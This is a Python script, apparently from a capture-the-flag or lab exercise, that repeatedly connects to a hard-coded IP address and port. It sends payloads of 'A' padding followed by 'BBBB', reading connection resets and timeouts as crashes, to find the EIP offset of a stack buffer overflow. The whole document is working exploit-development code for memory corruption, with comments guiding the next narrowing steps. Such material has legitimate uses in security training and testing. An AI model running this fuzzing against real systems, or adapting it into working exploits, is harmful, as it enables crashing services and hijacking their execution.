import socket
import time
import struct

HOST = '104.198.232.26'
PORT = 32074

def connect_and_send(payload, current_offset=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2) # Short timeout for responsiveness
        s.connect((HOST, PORT))

        # Try to receive initial banner/paragraph
        try:
            initial_data = s.recv(4096)
            if not initial_data: 
                print(f"[{current_offset}] Server closed connection immediately after connect or no banner.")
                return False 
            # print(f"[{current_offset}] Initial server response (first 100 bytes): {initial_data[:100]}") # Keep this for debugging if needed
        except socket.timeout:
            print(f"[{current_offset}] No initial response from server within timeout.")
            return False 

        # print(f"[{current_offset}] Sending payload of length: {len(payload)}") # Reduce verbosity
        s.sendall(payload)

        time.sleep(0.1) 

        try:
            response = s.recv(4096) 
            if not response: 
                # print(f"[{current_offset}] Server gracefully closed connection after sending payload.") # Reduce verbosity
                return False 
            # print(f"[{current_offset}] Server response after payload (first 100 bytes):\n{response[:100]}") # Reduce verbosity
            return True # Connection still alive and receiving data (not a crash)
        except socket.timeout:
            print(f"[{current_offset}] Server stopped responding after sending payload (timed out). This might be a hang or a soft crash.")
            return False 
        except ConnectionResetError:
            print(f"[{current_offset}] !!! CONNECTION RESET BY PEER. THIS IS A CRASH !!!")
            return False

    except ConnectionRefusedError:
        print(f"[{current_offset}] Connection refused. Server is likely down or crashed hard before connect.")
        return False
    except Exception as e:
        print(f"[{current_offset}] An error occurred: {e}")
        return False
    finally:
        s.close()

print("Continuing to find EIP offset by brute-forcing BBBB location...")
# Start well above the last non-crashing point (1253)
# Let's go up to, say, 2500 or 3000 bytes, incrementing by 10-20 to speed up.
# If it was 1201 last time, it might be that your 'A's were not padding, but part of data.
# The new crash point is likely to be quite a bit higher.
for potential_offset in range(1100, 3000, 20): # Increased range and step
    payload = b"A" * potential_offset + b"BBBB"

    print(f"Testing offset: {potential_offset} (Total payload length: {len(payload)})")
    result = connect_and_send(payload, potential_offset)

    if not result: # Connection reset or timeout means a potential crash/hang
        print(f"** Possible EIP offset found at {potential_offset} bytes of A's, followed by BBBB.")
        # At this point, if you get a crash, you've found a new range.
        # Then you'll narrow it down byte by byte around this new crash point.
        break 
    time.sleep(0.01) # Very small delay to allow faster iteration if server is fast
